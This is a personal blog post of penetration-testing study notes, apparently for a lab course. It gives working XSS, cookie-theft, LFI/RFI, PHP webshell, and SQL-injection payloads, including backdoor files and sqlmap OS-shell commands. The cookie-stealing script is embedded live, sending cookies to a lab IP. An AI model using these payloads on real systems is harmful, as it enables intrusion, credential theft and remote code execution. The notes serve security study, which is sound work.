<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Study Notes - 2021/03/16"><meta name="keywords" content="Study Notes,Penetration Testing"><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>Study Notes - 2021/03/16 | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-Site-Scripting-XSS"><span class="toc-number">1.</span> <span class="toc-text">Cross-Site Scripting (XSS)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Content-Injection"><span class="toc-number">2.</span> <span class="toc-text">Content Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Steal-cokie-and-session-information"><span class="toc-number">3.</span> <span class="toc-text">Steal cokie and session information</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Directory-Traversal-Vulnerabilities"><span class="toc-number">4.</span> <span class="toc-text">Directory Traversal Vulnerabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Identify"><span class="toc-number">4.1.</span> <span class="toc-text">Identify</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-inclusion-Vulnerabilities"><span class="toc-number">5.</span> <span class="toc-text">File inclusion Vulnerabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#local-file-inclusion-remote-file-inclusion"><span class="toc-number">5.1.</span> <span class="toc-text">local file inclusion&#x2F;remote file inclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Contaminating-Log-Files"><span class="toc-number">5.2.</span> <span class="toc-text">Contaminating Log Files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-file-inclusion"><span class="toc-number">5.3.</span> <span class="toc-text">Remote file inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell"><span class="toc-number">5.3.1.</span> <span class="toc-text">webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Expanding-Your-Repertoire"><span class="toc-number">5.4.</span> <span class="toc-text">Expanding Your Repertoire</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Wrappers"><span class="toc-number">5.5.</span> <span class="toc-text">PHP Wrappers</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-injection"><span class="toc-number">6.</span> <span class="toc-text">SQL injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Discover-SQL-Injection-Vulnerabilities"><span class="toc-number">6.1.</span> <span class="toc-text">Discover SQL Injection Vulnerabilities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Authentication-Bypass"><span class="toc-number">6.2.</span> <span class="toc-text">Authentication Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerating-the-database"><span class="toc-number">6.3.</span> <span class="toc-text">Enumerating the database</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Column-number-enueration"><span class="toc-number">6.3.1.</span> <span class="toc-text">Column number enueration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extra-further-data-with-union-statement"><span class="toc-number">6.4.</span> <span class="toc-text">extra further data with union statement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#From-sql-injection-to-code-execution"><span class="toc-number">6.5.</span> <span class="toc-text">From sql injection to code execution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Automating-sql-injection"><span class="toc-number">6.6.</span> <span class="toc-text">Automating sql injection</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">27</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">9</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Study Notes - 2021/03/16</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-16</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>Use phpmyadmin to execute arbitrary sql  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from webappdb.users;</span><br><span class="line">insert into webappdb.users(password, username) VALUES (&quot;backdoor&quot;,&quot;backdoor&quot;);</span><br></pre></td></tr></table></figure>


<h1 id="Cross-Site-Scripting-XSS"><a href="#Cross-Site-Scripting-XSS" class="headerlink" title="Cross-Site Scripting (XSS)"></a>Cross-Site Scripting (XSS)</h1><p>Once we identify an entry point, we can input special characters, and observe the output to see if any of the special characters return unfiltered.</p>
<h1 id="Content-Injection"><a href="#Content-Injection" class="headerlink" title="Content Injection"></a>Content Injection</h1><p>injsect invisible iframe <code>&lt;iframe src=http://192.168.119.148/report height=”0” width=”0”&gt;&lt;/iframe&gt;</code><br>Open listern on attack machine <code>sudo nc -nvlp 80</code><br>can redirect to information gathering script  </p>
<h1 id="Steal-cokie-and-session-information"><a href="#Steal-cokie-and-session-information" class="headerlink" title="Steal cokie and session information"></a>Steal cokie and session information</h1><script>new Image().src="http://192.168.119.148/cool.jpg?output="+document.cookie;</script>

<h1 id="Directory-Traversal-Vulnerabilities"><a href="#Directory-Traversal-Vulnerabilities" class="headerlink" title="Directory Traversal Vulnerabilities"></a>Directory Traversal Vulnerabilities</h1><h2 id="Identify"><a href="#Identify" class="headerlink" title="Identify"></a>Identify</h2><p>find any parameter in the url that looks like a file name<br>e.g. <code>http://192.168.148.10/menu.php?file=current_menu.php</code><br>modify the file to reference files that should be readable by any user on the system, such as<br>/etc/passwd on Linux or c:\boot.ini on Windows  <code>c:\windows\system32\drivers\etc\hosts</code>  </p>
<h1 id="File-inclusion-Vulnerabilities"><a href="#File-inclusion-Vulnerabilities" class="headerlink" title="File inclusion Vulnerabilities"></a>File inclusion Vulnerabilities</h1><p>included file will be executed. </p>
<h2 id="local-file-inclusion-remote-file-inclusion"><a href="#local-file-inclusion-remote-file-inclusion" class="headerlink" title="local file inclusion/remote file inclusion"></a>local file inclusion/remote file inclusion</h2><p>different from where the file included from<br>We must locate<br>parameters we can manipulate and attempt to use them to load arbitrary files. However, a file inclusion takes this one step further, as we attempt execute the contents of the file within the application.  </p>
<h2 id="Contaminating-Log-Files"><a href="#Contaminating-Log-Files" class="headerlink" title="Contaminating Log Files"></a>Contaminating Log Files</h2><p>clear log<br>connect the servier with <code>&lt;?php echo &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;/pre&gt;&#39;;?&gt;</code><br>This output is first wrapped in pre HTML tags, which preserve any line breaks or formatting in the results of the function call.<br>inserted into the access log of apache:<br><code>192.168.119.148 - - [16/Mar/2021:18:18:11 -0700] &quot;&lt;?php echo &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;/pre&gt;&#39;;?&gt;\n&quot; 400 980 &quot;-&quot; &quot;-&quot;</code>  </p>
<p>access the file inclusion url <code>http://192.168.148.10/menu.php?file=c:\xampp\apache\logs\access.log&amp;cmd=ipconfig</code>  </p>
<h2 id="Remote-file-inclusion"><a href="#Remote-file-inclusion" class="headerlink" title="Remote file inclusion"></a>Remote file inclusion</h2><p>Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the server must be configured in a very specific way, but they are usually easier to exploit. For example, PHP apps must be configured with allow_url_include set to “On”.  </p>
<p><code>http://192.168.148.10/menu.php?file=http://192.168.119.148/evil.txt&amp;cmd=ipconfig</code><br>host the file by setup a apache server  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;var&#x2F;www&#x2F;html&#x2F;evil.txt</span><br><span class="line">sudo systemctl start apache2</span><br><span class="line"></span><br><span class="line">or </span><br><span class="line"></span><br><span class="line">sudo python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p><code>/usr/share/webshells</code>  </p>
<h2 id="Expanding-Your-Repertoire"><a href="#Expanding-Your-Repertoire" class="headerlink" title="Expanding Your Repertoire"></a>Expanding Your Repertoire</h2><p>open a http server on current workign path</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 2334</span><br><span class="line">python3 -m http.server 7331</span><br><span class="line">php -S 0.0.0.0:8000</span><br><span class="line">ruby -run -e httpd . -p 9000</span><br><span class="line">busybox httpd -f -p 10000</span><br></pre></td></tr></table></figure>

<h2 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h2><p>when cannot poison local files<br><code>menu.php?file=data:text/plain,hello world</code><br>treat the data wrapper as a file<br><code>menu.php?file=data:text/plain,&lt;?php echo shell_exec(&quot;dir&quot;) ?&gt;</code>  </p>
<h1 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h1><h2 id="Discover-SQL-Injection-Vulnerabilities"><a href="#Discover-SQL-Injection-Vulnerabilities" class="headerlink" title="Discover SQL Injection Vulnerabilities"></a>Discover SQL Injection Vulnerabilities</h2><p>Common statement in sql;<br><code>$query = &quot;select * from users where username = &#39;$user&#39; and password = &#39;$pass&#39;&quot;;</code>  </p>
<h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><p><code>tom&#39; or 1=1;#</code>  <code>#</code> is comment in mysql and mariadb<br>Some web application expect the number of returned rows is 1  add LIMIT 1 <code>tom&#39; or 1=1 LIMIT 1;#</code>  </p>
<h2 id="Enumerating-the-database"><a href="#Enumerating-the-database" class="headerlink" title="Enumerating the database"></a>Enumerating the database</h2><p><code>http://192.168.148.10/debug.php?id=&#39;</code>  </p>
<h3 id="Column-number-enueration"><a href="#Column-number-enueration" class="headerlink" title="Column number enueration"></a>Column number enueration</h3><p><code>http://192.168.148.10/debug.php?id=1 order by 1</code><br>Use burpsuit repeater tool<br>results cotain 3 colums</p>
<h2 id="extra-further-data-with-union-statement"><a href="#extra-further-data-with-union-statement" class="headerlink" title="extra further data with union statement"></a>extra further data with union statement</h2><p>decide which colum is displayed<br><code>192.168.148.10/debug.php?id=1 union all select 1,2,3</code>  </p>
<p><strong>Union all allow duplicate values</strong>  </p>
<p>colum 2,3 get displayed<br>extract database verison: (depend on database engine, MariaDB use @@version)<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, @@version</code>  -&gt;  10.1.31-MariaDB<br>extract current database user<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, user() </code>  -&gt; root@localhost  </p>
<p>We can enumerate database tables and column structures through the information_schema.<br>The information schema stores information about the database, like table and column names.<br>We can use it to get the layout of the database so that we can craft better payloads to extract<br>sensitive data. The query for this would look similar to the following:<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables</code>  </p>
<p>retrieve column name of user table:<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name=&#39;users&#39;</code></p>
<p>extra user name and password:<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, username, password from users</code></p>
<h2 id="From-sql-injection-to-code-execution"><a href="#From-sql-injection-to-code-execution" class="headerlink" title="From sql injection to code execution"></a>From sql injection to code execution</h2><p><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, load_file(&#39;C:/Windows/System32/drivers/etc/hosts&#39;)</code></p>
<p>into outfile:<br>from the error message, we know the location of webserver root: c:\xampp\htdocs  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.148.10&#x2F;debug.php?id&#x3D;1 union all select 1, 2, &quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot; into OUTFILE &#39;c:&#x2F;xampp&#x2F;htdocs&#x2F;backdoor2.php&#39;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.148.10&#x2F;debug.php?id&#x3D;1 union all select 1, 2, &quot;&lt;?php &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;&#x2F;pre&gt;&#39;;?&gt;&quot; into OUTFILE &#39;c:&#x2F;xampp&#x2F;htdocs&#x2F;backdoor4.php&#39;</span><br></pre></td></tr></table></figure>

<h2 id="Automating-sql-injection"><a href="#Automating-sql-injection" class="headerlink" title="Automating sql injection"></a>Automating sql injection</h2><p>sqlmap – not allowed in the exam<br><code>sqlmap -u http://192.168.148.10/debug.php?id=1 -p &quot;id&quot;</code><br>-p parameter to test  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1 AND 6836&#x3D;6836</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: id&#x3D;1 AND (SELECT 4323 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(4323&#x3D;4323,1))),0x716b627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1 AND (SELECT 1257 FROM (SELECT(SLEEP(5)))yDOk)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id&#x3D;1 UNION ALL SELECT NULL,CONCAT(0x7171767071,0x5a65795043747065446255675763434c564c48537750534f6d437859715570677765524e4552616a,0x716b627a71),NULL-- -</span><br></pre></td></tr></table></figure>

<p>automate the data extraction<br><code>sqlmap -u http://192.168.148.10/debug.php?id=1 -p &quot;id&quot; --dbms=mysql --dump</code></p>
<p>mysql and mariadb looks similar  </p>
<p>get os shell automatically:<br><code>sqlmap -u http://192.168.148.10/debug.php?id=1 -p &quot;id&quot; --dbms=mysql --os-shell</code></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Gavin Cui</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gavincrz.github.io/2021/03/16/Study-Notes-2021-03-16/">https://gavincrz.github.io/2021/03/16/Study-Notes-2021-03-16/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Study-Notes/">Study Notes</a><a class="post-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/03/17/Study-Notes-2021-03-17/"><i class="fa fa-chevron-left">  </i><span>Study Notes - 2021/03/17</span></a></div><div class="next-post pull-right"><a href="/2021/03/16/Study-Notes-2021-03-15/"><span>Study Notes - 2021/03/15</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>